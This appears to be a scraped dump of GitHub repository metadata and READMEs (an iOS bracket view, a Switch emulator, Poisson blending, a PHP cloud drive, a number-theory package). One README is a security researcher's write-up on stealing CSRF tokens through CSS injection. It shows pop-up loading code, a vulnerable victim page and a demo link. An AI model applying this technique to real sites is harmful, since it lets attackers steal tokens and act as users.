false\n```\n\n|`.portrait`(初期)|`.landscapeLeft`|`.landscapeRight`|`.portraitUpsideDown`|\n|:--:|:--:|:--:|:--:|\n|`.left`|`.bottom`|`.top`|`.right`|\n|`.top`|`.left`|`.right`|`.bottom`|\n|`.leftRight(.top)`|`.topBottom(.left)`|`.topBottom(.right)`|`.leftRight(.bottom)`|\n\n\n## Release Note\n+ 1.0.0 :\n  - First release 🎉\n\n\n## Contributing to this project\nI'm seeking bug reports and feature requests.\n\n\n## License\nKRTournamentView is available under the MIT license.\n\nSee the LICENSE file for more info.\n","byteSize":9315},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":121},"createdAt":"2018-02-04T08:35:35Z","updatedAt":"2018-02-15T08:54:58Z","pushedAt":"2018-02-04T08:36:52Z","description":"KRTournamentView is a flexible tournament bracket that can respond to the various structure on iOS.","subscribersCount":{"totalCount":3},"diskUsage":52,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":1}}},"tags":{"totalCount":1},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"gdkchan","followers":{"totalCount":66},"repositories":{"totalCount":29},"following":{"totalCount":1},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":6},"websiteUrl":null},"repository":{"name":"Ryujinx","primaryLanguage":{"name":"C#"},"license":"The Unlicense","isArchived":false,"hasWikiEnabled":true,"forkCount":16,"readme_md":{"text":"# Ryujinx [![Build status](https://ci.appveyor.com/api/projects/status/ssg4jwu6ve3k594s?svg=true)](https://ci.appveyor.com/project/gdkchan/ryujinx)\n\nExperimental Switch emulator written in C#\n\nDon't expect much from this. Some homebrew apps works, and Tetris shows the intro logos (sometimes) but that's about it for now.\nContributions are always welcome.\n\n**Building**\n\nTo build this emulator, you need the .NET Core 2.0 (or higher) SDK. https://www.microsoft.com/net/download/\nIn release builds, memory checks are disabled to improve performances.\n\nOr just drag'n'drop the *.NRO or the game folder on  the executable if you have a pre-build version.\n\n**Features**\n\n - Audio is partially supported (glitched) on Windows but you need to install the OpenAL Core SDK.\nhttps://openal.org/downloads/OpenAL11CoreSDK.zip\n\n - Keyboard Input is partially supported:\n   - Arrows.\n   - Enter > \"Start\" & Tab > \"Select\"\n   - Qwerty: \n     - A > \"A\"\n     - S > \"B\"\n     - Z > \"X\"\n     - X > \"Y\"\n   - Azerty:\n     - Q > \"A\"\n     - S > \"B\"\n     - W > \"X\"\n     - X > \"Y\" \n\n - Config File: `Ryujinx.conf` should be present on executable folder.\n   - Logging_Enable_Info (bool)\n   Enable the Informations Logging.\n\n   - Logging_Enable_Trace (bool)\n   Enable the Trace Logging (Enabled in Debug recommanded).\n\n   - Logging_Enable_Debug (bool)\n   Enable the Debug Logging (Enabled in Debug recommanded).\n\n   - Logging_Enable_Warn (bool)\n   Enable the Warning Logging (Enabled in Debug recommanded).\n\n   - Logging_Enable_Error (bool)\n   Enable the Error Logging (Enabled in Debug recommanded).\n\n   - Logging_Enable_Fatal (bool)\n   Enable the Fatal Logging (Enabled in Debug recommanded).\n\n   - Logging_Enable_LogFile (bool)\n   Enable writing the logging inside a Ryujinx.log file.\n\n**Help**\n\nIf you have some homebrews that currently doesn't work on it, you can contact us through discord with the compiled NRO/NSO (and source code if possible) and will work to make them work.\n\n**Contact**\n\nFor help, support, suggestion, or if you just want to get in touch with the team, join our Discord server!\nhttps://discord.gg/VkQYXAZ\n\n**Running**\n\nTo run this emulator, you need the .NET Core 2.0 (or higher) SDK.\nRun `dotnet run -c Release -- path\\to\\homebrew.nro` inside the Ryujinx solution folder to run homebrew apps.\nRun `dotnet run -c Release -- path\\to\\game_exefs_and_romfs_folder` to run official games (they need to be decrypted and extracted first!).\n\nAudio is partially supported (glitched) on Linux and macOS, for Windows you need to install the OpenAL Core SDK:\nhttps://openal.org/downloads/OpenAL11CoreSDK.zip\n\n**Lastest build**\n\nThose builds are compiled automatically for each commit on the master branch. They may be unstable or not work at all.\nTo download the lastest automatic build for Windows (64-bits), [Click Here](https://ci.appveyor.com/api/projects/gdkchan/ryujinx/artifacts/ryujinx_lastest_unstable.zip).\n","byteSize":2906},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":143},"createdAt":"2018-02-04T23:07:54Z","updatedAt":"2018-02-16T22:09:28Z","pushedAt":"2018-02-16T02:19:30Z","description":"Experimental Switch emulator written in C#","subscribersCount":{"totalCount":34},"diskUsage":230,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":18},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":10}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":45}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"Erkaman","followers":{"totalCount":216},"repositories":{"totalCount":71},"following":{"totalCount":124},"location":"Sweden, Gothenburg","organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}}],"totalCount":20},"websiteUrl":"https://erkaman.github.io/"},"repository":{"name":"poisson_blend","primaryLanguage":{"name":"C++"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":3,"readme_md":{"text":"# poisson_blend - A simple, readable implementation of Poisson Blending\n\nAn implementation of Poisson Blending, that demonstrates the concepts explained in [my article](https://erkaman.github.io/posts/poisson_blending.html).\n\nTo use the progam, you specify a source image and a target image. The source image is seamlessly copied and pasted\ninto the target image, at some specified pixel location.\n\nBy running the command line\n\n```\npoisson_blend -source img/kitten.png -target img/library.png -mask img/kittenmask.png -output result.png -mx 280 -my 340\n```\n\nAn image of a kitten can be seamlessly copied and pasted into the library, at the position (280, 340), as can be seen below.\nThe mask specifies which pixels of the kitten should actually be copied and pasted. The remaining pixels are ignored.\nNote that only pure red pixels of RGB color `(255,0,0)` are considered part of the mask.\n\nThe result of the above command line can be seen below:\n\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/kitten.png\" alt=\"kitten\" width=\"37\" height=\"46\"></td>\n<td align=\"center\"><img src=\"img/library.png\" alt=\"library\" width=\"240\" height=\"164\"></td>\n<td align=\"center\"><img src=\"img/kittenmask.png\" alt=\"kitten mask\" width=\"37\" height=46\"></td>\n<td align=\"center\"><img src=\"img/kitten_library.png\" alt=\"kitten mask\" width=\"240\" height=\"164\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">mask</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n## Gallery\n\nA small gallery of images made with this program are presented below.\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/penguin.png\" alt=\"penguin\" width=\"49\" height=\"74\"></td>\n<td align=\"center\"><img src=\"img/library.png\" alt=\"library\" width=\"240\" height=\"164\"></td>\n<td align=\"center\"><img src=\"img/penguin_library.png\" alt=\"penguin library\" width=\"240\" height=\"164\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/moon.png\" alt=\"moon\" width=\"194\" height=\"129\"></td>\n<td align=\"center\"><img src=\"img/gothenburg.png\" alt=\"gothenburg\" width=\"204\" height=\"163\"></td>\n<td align=\"center\"><img src=\"img/moon_gothenburg.png\" alt=\"moon gothenburg\" width=\"204\" height=\"163\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/penguin.png\" alt=\"penguin\" width=\"49\" height=\"74\"></td>\n<td align=\"center\"><img src=\"img/beach.png\" alt=\"beach\" width=\"240\" height=\"164\"></td>\n<td align=\"center\"><img src=\"img/penguin_beach.png\" alt=\"penguin beach\" width=\"240\" height=\"164\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/eagle.png\" alt=\"eagle\" width=\"166\" height=\"135\"></td>\n<td align=\"center\"><img src=\"img/liberty.png\" alt=\"liberty\" width=\"240\" height=\"180\"></td>\n<td align=\"center\"><img src=\"img/eagle_liberty.png\" alt=\"eagle liberty\" width=\"240\" height=\"180\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/watereagle.png\" alt=\"water eagle\" width=\"148\" height=\"55\"></td>\n<td align=\"center\"><img src=\"img/lake.png\" alt=\"lake\" width=\"270\" height=\"202\"></td>\n<td align=\"center\"><img src=\"img/watereagle_lake.png\" alt=\"water eagle lake\" width=\"270\" height=\"202\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n\n<table><thead>\n</thead><tbody>\n<tr>\n<td align=\"center\"><img src=\"img/balloon.png\" alt=\"balloon\" width=\"93\" height=\"112\"></td>\n<td align=\"center\"><img src=\"img/collosseum.png\" alt=\"colosseum\" width=\"266\" height=\"199\"></td>\n<td align=\"center\"><img src=\"img/balloon_collosseum.png\" alt=\"balloon colosseum\" width=\"266\" height=\"199\"></td>\n</tr>\n<tr>\n<td align=\"center\">source</td>\n<td align=\"center\">target</td>\n<td align=\"center\">result</td>\n</tr>\n</tbody></table>\n\n## Building\n\nThe only dependencies are [lodepng](https://github.com/lvandeve/lodepng) and [Eigen](http://eigen.tuxfamily.org/index.php?title=Main_Page).\nBoth of which are included within this repository.\n\nWe use CMake for building. If on Linux or OS X, you can build it in the terminal by doing something like:\n\n```\nmkdir build && cd build && cmake .. && make\n```\n\nIf on Windows, create a `build/` folder, and run `cmake ..` from\ninside that folder. This will create a visual studio solution(if you\nhave visual studio). Launch that solution, and then simply compile the\nproject named `poisson_blend`.\n\n## Image Sources\n\nBelow we list the soures of all images that we used in the gallery.\n\n- [kitten.png](https://www.flickr.com/photos/rondeboom/9296207416/)\n- [library.png](https://www.flickr.com/photos/uowarchives/5513608992/)\n- [gothenburg.png](https://www.flickr.com/photos/belola/4257701496/)\n- [moon.png](https://www.flickr.com/photos/dcmaster/7533083314/)\n- [penguin.png](https://www.flickr.com/photos/141457238@N03/26834524313/)\n- [beach.png](https://www.flickr.com/photos/notcub/2568905280)\n- [liberty.png](https://www.flickr.com/photos/reinholdbehringer/3698799772/)\n- [eagle.png](https://www.flickr.com/photos/bobengr/32130057682/)\n- [lake.png](https://www.flickr.com/photos/74444001@N00/62802646)\n- [watereagle.png](https://www.flickr.com/photos/mickthompson/16549423644)\n- [collosseum.png](https://www.flickr.com/photos/sandravoetbal/4075677218)\n- [balloon.png](https://www.flickr.com/photos/prestonkemp/4655399966/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n","byteSize":5853},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":152},"createdAt":"2018-02-04T19:45:35Z","updatedAt":"2018-02-16T23:41:25Z","pushedAt":"2018-02-08T16:24:11Z","description":"Seamless copy-and-paste of images with Poisson Blending.","subscribersCount":{"totalCount":2},"diskUsage":12172,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":2}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"HFO4","followers":{"totalCount":98},"repositories":{"totalCount":31},"following":{"totalCount":18},"location":"Fuyang,Anhui","organizations":{"totalCount":2},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://aoaoao.me"},"repository":{"name":"Cloudreve","primaryLanguage":{"name":"PHP"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":24,"readme_md":{"text":"![logo_white.png](https://raw.githubusercontent.com/HFO4/Cloudreve/master/static/img/logo_white.png)\n\nCloudreve - Make the cloud easy for everyone\n=========================\n[![Packagist](https://img.shields.io/packagist/v/HFO4/Cloudreve.svg)](https://packagist.org/packages/hfo4/cloudreve)\n[![Latest Unstable Version](https://poser.pugx.org/hfo4/cloudreve/v/unstable)](https://packagist.org/packages/hfo4/cloudreve)\n[![License](https://poser.pugx.org/hfo4/cloudreve/license)](https://packagist.org/packages/hfo4/cloudreve)\n\n基于ThinkPHP构建的网盘系统，能够助您以较低成本快速搭建起公私兼备的网盘。\n\n![homepage.png](https://download.aoaoao.me/homepage.png)\n\n目前已经实现的特性：\n\n* 快速对接多家云存储，支持七牛、又拍云、阿里云OSS、AWS S3、自建远程服务器，当然，还有本地存储\n* 可限制单文件最大大小、MIMEType、文件后缀、用户可用容量\n* 图片、音频、视频、文本、Markdown、Ofiice文档 在线预览\n* 移动端全站响应式布局\n* 文件、目录分享系统，可创建私有分享或公开分享链接\n* 用户个人主页，可查看用户所有分享\n* 多用户系统、用户组支持\n* 初步完善的后台，方便管理\n* 拖拽上传、分片上传、断点续传、下载限速（*实验性功能）\n* 多上传策略，可为不同用户组分配不同策略\n* 用户组基础权限设置、二步验证\n* WebDAV协议支持\n\n安装需求\n------------\n* LNMP/AMP With PHP5.6+\n* curl、fileinfo、gd扩展\n* Composer\n\n简要安装说明\n------------\n\n#### 1.使用Composer安装主程序\n```\n#安装开发版\n$ composer create-project hfo4/cloudreve:dev-master\n```\n\n```\n#等待安装依赖库后，会自动执行安装脚本，按照提示输入数据库账户信息\n   ___ _                 _                    \n  / __\\ | ___  _   _  __| |_ __ _____   _____ \n / /  | |/ _ \\| | | |/ _` | '__/ _ \\ \\ / / _ \\\n/ /___| | (_) | |_| | (_| | | |  __/\\ V /  __/\n\\____/|_|\\___/ \\__,_|\\__,_|_|  \\___| \\_/ \\___|\n        \n                Ver XX\n================================================\n#按提示输入信息\n......\n```\n\n```\n#出现如下提示表示安装完成\nCongratulations! Cloudreve has been installed successfully.\n\nHere's some informatioin about yor Cloudreve:\nHomepage: https://pan.aoaoao.me/\nAdmin Panel: https://pan.aoaoao.me/Admin\nDefault username: admin@cloudreve.org\nDefault password: admin\n```\n\n#### 2.目录权限\n`runtime`目录需要写入权限，如果你使用本地存储，`public` 目录也需要有写入权限\n\n#### 3.URL重写\n对于Apache服务器，项目目录下的`.htaccess`已经配置好重写规则，如有需求酌情修改.\n对于Nginx服务器，以下是一个可供参考的配置：\n```\nlocation / {\n   if (!-e $request_filename) {\n   rewrite  ^(.*)$  /index.php?s=/$1  last;\n   break;\n    }\n }\n```\n\n#### 4.完成\n后台地址：`http://您的域名/Admin` 初始用户名：`admin@cloudreve.org` 初始密码：`admin`\n#### 后续操作\n以下操作不是必须的，但仍推荐你完成这些操作：\n* 修改初始账户密码\n* 到 设置-基础设置 中更改站点URL，如果不更改，程序无法正常接受回调请求\n* 添加Crontab定时任务 ：你的域名/Cron\n* 如果你打算使用本地上传策略并且不准备开启外链功能，请将·public/uploads·目录设置为禁止外部访问\n* 如需启用二步验证功能，请依次执行`composer require phpgangsta/googleauthenticator:dev-master` `composer require endroid/qrcode`安装二步验证支持库\n* 给本项目一个Star~\n\n文档\n------------\n* [完整安装说明](https://github.com/HFO4/Cloudreve/wiki/%E5%AE%89%E8%A3%85%E8%AF%B4%E6%98%8E)\n* [安装及初次使用FAQ](https://github.com/HFO4/Cloudreve/wiki/%E5%AE%89%E8%A3%85%E5%8F%8A%E5%88%9D%E6%AC%A1%E4%BD%BF%E7%94%A8FAQ)\n\n许可证\n------------\nGPLV3\n","byteSize":3871},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":195},"createdAt":"2018-02-04T04:56:38Z","updatedAt":"2018-02-17T06:05:26Z","pushedAt":"2018-02-16T03:59:23Z","description":"A project helps you build your own cloud in minutes.","subscribersCount":{"totalCount":14},"diskUsage":3999,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":10},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":13},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":8},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":68}}},"tags":{"totalCount":3},"releases":{"totalCount":3},"type":"user"},"siteAdmin":"false"},{"user":{"login":"dxa4481","followers":{"totalCount":381},"repositories":{"totalCount":78},"following":{"totalCount":4},"location":"USA","organizations":{"totalCount":1},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://security.love"},"repository":{"name":"cssInjection","primaryLanguage":{"name":"HTML"},"license":"GNU General Public License v2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":30,"readme_md":{"text":"# Stealing CSRF tokens with CSS injection (without iFrames)\n\nA post [here](https://www.curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html) details a method for stealing sensitive data with CSS injection by using Attribute Selectors and iFrames. Because this method requires iFrames, and most major websites disallow being framed, this attack isn't always practical. \n\nHere I'll detail here a way to do this without iFrames, effectively stealing a CSRF token in about 10 seconds.\n\nOnce the CSRF token is stolen, because the victim is already on an attacker website, the attacker can go ahead and complete a CSRF attack against the user.\n\n## Background\n\nAs the original post describes, [CSS attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors) developers to select elements based on substring matches of the value of attribute tags. These value selectors can do one of three things\n\n+ Match if the string starts with the substring\n+ Match if the string ends with the substring\n+ Match if the string contains the substring anywhere\n\nOne practical use case for this is to color all `href` attributes that start with \"https://example.com\" a special color.\n\nAn unfortunate by-product of this is, sensitive information can sometimes be stored in html attribute values. Most often, CSRF tokens are stored this way: in value attributes on hidden forms.\n\nThis allows us to match CSS selectors to the attributes on the form in question, and based on whether the form matches the starting string, load an extrenal resource such as a background image, which signals to the attacker the first charecter.\n\nUsing this method, they can walk down the string, and exfiltrate the entire secret value.\n\nTo pull this off, the victim server needs to allow or be vulnerable to arbitrary CSS being rendered. This can occur through CSS injection, or a feature on the website allowing you to include stylesheets. Note: the website does not need to be vulnerable to XSS.\n\nTo render the victim's CSS, the original paper proposes using iFrames. The limitations of this are of course if the victim website disallows being framed.\n\nThere is also a space/time tradeoff of either loading all possible charecters at once in paralell, or multiplexing them one at a time. In my example to save time, I've elected to load them all at once. In some senarios where the injection is small, multiplexing may prove to be the more viable option.\n\n## Without iFrames\nTo do this without iFrames, I've used a method similiar to one I've discussed [before](https://github.com/dxa4481/windowHijacking): I'll create a popup and then alter the location of the popup after a set timer.\n\nUsing this method, I can still load the victim's CSS, but I no longer depend on the victim being frameable. Because the initial pop-up is triggered via user event, I am not blocked by the browser.\n\nTo force a hard reload, I have the pop-up load a dummy window between CSS injections. This can be seen below\n\n```javascript\nvar win2 = window.open('https://security.love/anything', 'f', \"top=100000,left=100000,menubar=1,resizable=1,width=1,height=1\")\nvar win2 = window.open(`https://security.love/cssInjection/victim.html?injection=${css}`, 'f', \"top=100000,left=100000,menubar=1,resizable=1,width=1,height=1\")\n ```\n\n## Without a backend server\nThe original paper describes exfiltrating data to a backend server, however becuase the CSRF is a client side attack, if we can come up with a way to do this without a server, we save a lot of overhead and complexity.\n\nIn order to recieve the victim's resource loads client side, we can make use of Service Workers, which can intercept and read request data. Service Workers currently only apply to requests coming in from the Same Origin, and so for my demo I've cheated and put both the victim and attacker pages on the same origin.\n\nSoon though, chrome may merge in this [experimental feature](https://developers.google.com/web/updates/2016/09/foreign-fetch) which allows cross origin requests to be intercepted by service workers.\n\nWith this addition, we can make our attack 100% client side, and force users to perform CSRF actions in under 10 seconds of clicking the link, as seen in the demo below:\n\n## Demo\nAs explained above, becuase I don't want to run a web server (github pages is great) I'm cheating and using service workers to intercept and mock the server side component. As a result, for now, this demo only works in Chrome.\n\nFirst I've created a very simple victim, that has a DOM based CSS injection, and placed a sensitive token on the page. I've made this DOM based to again, remove the need for a server. You may notice I've also included some protection against script tag injection, by encoding less than and greater than signs.\n\n```html\n    <form action=\"https://security.love\" id=\"sensitiveForm\">\n        <input type=\"hidden\" id=\"secret\" name=\"secret\" value=\"dJ7cwON4BMyQi3Nrq26i\">\n    </form>\n    <script src=\"mockingTheBackend.js\"></script>\n    <script>\n        var fragment = decodeURIComponent(window.location.href.split(\"?injection=\")[1]);\n        var htmlEncode = fragment.replace(/</g,\"&lt;\").replace(/>/g,\"&gt;\");\n        document.write(\"<style>\" + htmlEncode + \"</style>\");\n    </script>\n```\n\nNext, our attacker forces a load of the victim's CSS, and using the method described above, we steal the sensitive token one charecter at a time.\n\nOn the recieving end, I've defined a service worker that intercepts the requests, and sends them back to the domain via post-message, and then we store the token in local storage for future use. You can imagine a back end web server filling this function, and posting back the CSRF token to the attacker domain via web socket or polling.\n\nONLY TESTED IN CHROME RIGHT NOW:\n\n[demo](https://security.love/cssInjection/attacker.html)\n\nIf everything works, after clicking somewhere on the page, you should see the CSRF token exfiltrated one charecter at a time from the victim page.\n\n## Final thoughts\nInterestingly enough, reflected CSS injection is actually more deadly than stored CSS injection, because stored CSS injection would require a server to update the CSS for the victim before rendering.\n\nFor some time CSS injection has gone back and forth on severity. It used to be IE allowed users to execute Javascript in CSS. This demo hopefully shows that CSS injection, and rendering untrusted CSS on your domain can still lead to serious security vulnerabilities\n","byteSize":6474},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":213},"createdAt":"2018-02-04T04:09:02Z","updatedAt":"2018-02-14T20:32:39Z","pushedAt":"2018-02-07T20:50:12Z","description":"Stealing CSRF tokens with CSS injection (without iFrames)","subscribersCount":{"totalCount":10},"diskUsage":32,"pullRequestsOpen":{"totalCount":2},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":3},"numCommits":{"target":{"history":{"totalCount":14}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"louisabraham","followers":{"totalCount":28},"repositories":{"totalCount":29},"following":{"totalCount":8},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":"https://louisabraham.github.io/"},"repository":{"name":"algnuth","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":6,"readme_md":{"text":"![travis](https://travis-ci.org/louisabraham/algnuth.svg?branch=master)\n\nAlgebraic Number Theory package\n===============================\n\n**Louis Abraham** and **Yassir Akram**\n\nInstallation\n------------\n\n    pip install --upgrade algnuth\n\nor get the development version with:\n\n    pip install --upgrade git+https://github.com/louisabraham/algnuth\n\nFeatures\n--------\n\n### Jacobi symbol\n\n``` python\n>>> from algnuth.jacobi import jacobi\n>>> jacobi(3763, 20353)\n-1\n```\n\n### Solovay--Strassen primality test\n\n``` python\n>>> from algnuth.jacobi import solovay_strassen\n>>> p = 12779877140635552275193974526927174906313992988726945426212616053383820179306398832891367199026816638983953765799977121840616466620283861630627224899026453\n>>> q = 12779877140635552275193974526927174906313992988726945426212616053383820179306398832891367199026816638983953765799977121840616466620283861630627224899027521\n>>> n = p * q\n>>> solovay_strassen(p)\nTrue\n>>> solovay_strassen(q)\nTrue\n>>> solovay_strassen(n)\nFalse\n```\n\n### Quadratic forms\n\n``` python\n>>> from algnuth.quadratic import *\n>>> display_classes(-44)\nx^2 + 11⋅y^2\n2⋅x^2 + 2⋅xy + 6⋅y^2\n3⋅x^2 - 2⋅xy + 4⋅y^2\n3⋅x^2 + 2⋅xy + 4⋅y^2\n>>> display_primitive_forms(-44)\nx^2 + 11⋅y^2\n3⋅x^2 - 2⋅xy + 4⋅y^2\n3⋅x^2 + 2⋅xy + 4⋅y^2\n>>> 